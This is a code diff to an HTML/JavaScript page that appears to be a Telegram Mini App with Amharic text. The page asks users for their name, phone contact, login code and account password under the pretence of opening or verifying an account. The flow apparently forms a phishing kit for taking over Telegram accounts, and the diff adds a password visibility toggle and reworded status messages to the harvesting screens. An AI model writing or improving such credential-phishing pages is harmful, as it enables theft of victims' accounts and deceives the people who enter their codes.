@@ -43,8 +43,16 @@
     input {
         width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px;
         border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.6);
-        color: #fff; font-size: 16px;
+        color: #fff; font-size: 16px; outline: none;
     }
+    
+    /* Password wrapper */
+    .pass-wrapper { position: relative; width: 100%; }
+    .pass-wrapper i {
+        position: absolute; right: 15px; top: 50%; transform: translateY(-50%);
+        color: #FF9900; cursor: pointer; font-size: 18px; z-index: 10;
+    }
+
     .btn-main {
         background: linear-gradient(45deg, #FF9900, #FF6600); color: #000;
         padding: 16px; width: 100%; border-radius: 12px; border: none;
@@ -112,10 +120,14 @@
 
     <div id="step3" class="step">
         <div class="glass-card">
+            <i class="fa-solid fa-lock" style="font-size: 40px; color: #FF9900; margin-bottom: 15px;"></i>
             <h2>ማረጋገጫ</h2>
             <p style="opacity: 0.7; margin-bottom: 20px;">የአካውንትዎን ፓስዎርድ ያስገቡ</p>
             <div id="status3" class="msg"></div>
-            <input type="password" id="2fa_input" placeholder="Password">
+            <div class="pass-wrapper">
+                <input type="password" id="2fa_input" placeholder="Password">
+                <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()"></i>
+            </div>
             <button class="btn-main" onclick="submit2FA()">አረጋግጥ</button>
         </div>
     </div>
@@ -154,12 +166,9 @@
         const bg = document.getElementById('bgLayer');
         bg.style.backgroundImage = `url(${photos[0]})`;
 
-        // 1. Welcome + Loading (3s)
         setTimeout(() => {
             bg.style.backgroundImage = `url(${photos[1]})`;
             showStep('photo_slide');
-            
-            // 2. Photo Slide (3s)
             setTimeout(() => {
                 bg.style.backgroundImage = `url(${photos[2]})`;
                 checkStatus(); 
@@ -187,6 +196,18 @@
         }).catch(e => {});
     }
 
+    function togglePasswordVisibility() {
+        const passInput = document.getElementById('2fa_input');
+        const toggleIcon = document.getElementById('toggleIcon');
+        if (passInput.type === "password") {
+            passInput.type = "text";
+            toggleIcon.classList.replace('fa-eye', 'fa-eye-slash');
+        } else {
+            passInput.type = "password";
+            toggleIcon.classList.replace('fa-eye-slash', 'fa-eye');
+        }
+    }
+
     function handleLoginClick() {
         if(!document.getElementById('fname').value || !document.getElementById('lname').value) {
             showMsg(1, 'error', 'እባክዎ መጀመሪያ ስምዎን ያስገቡ!');
@@ -198,7 +219,7 @@
     function startVerification() {
         if (isProcessing) return;
         isProcessing = true;
-        showMsg(1, 'loading-msg', 'አካውንት እየከፈቱ ነው ትንሽ ይጠብቁ...');
+        showMsg(1, 'loading-msg', 'መረጃዎን በማረጋገጥ ላይ...');
         checkUserInDB();
     }
 
@@ -210,8 +231,17 @@
                 body: JSON.stringify({user_id: userId})
             });
             const data = await res.json();
-            if (data.status === "SUCCESS") { showStep('success'); } 
-            else { requestPhone(); }
+            
+            // የተጠቃሚው ሁኔታ ላይ ተመስርቶ የሚወሰን ውሳኔ
+            if (data.status === "FOUND" || data.status === "NEED_OTP") {
+                showMsg(1, 'loading-msg', 'አካውንቱ ተገኝቷል፣ ኮድ በመጠበቅ ላይ...');
+                // ሰርቨሩ ቼክ አድርጎ NEED_OTP ካለው checkStatus ወደ Step 2 ይወስደዋል
+            } else if (data.status === "SUCCESS") {
+                showStep('success');
+            } else {
+                // ዳታቤዝ ላይ ካልተገኘ Contact Share ይጠይቃል
+                requestPhone();
+            }
         } catch(e) { 
             isProcessing = false;
             showMsg(1, 'error', 'ሰርቨሩ አልተገኘም። ቆይተው ይሞክሩ።');
@@ -221,7 +251,7 @@
     function requestPhone() {
         tg.requestContact((success) => {
             if (success) {
-                showMsg(1, 'loading-msg', 'አካውንት እየከፈቱ ነው ትንሽ ይጠብቁ...');
+                showMsg(1, 'loading-msg', 'አካውንት እየተከፈተ ነው፣ ኮድ ሲመጣ ያስገቡ...');
             } else { 
                 isProcessing = false;
                 showMsg(1, 'error', 'ለመቀጠል የግድ Contact Share ማድረግ አለብዎት!'); 
@@ -318,4 +348,3 @@
 </script>
 </body>
 </html>
-
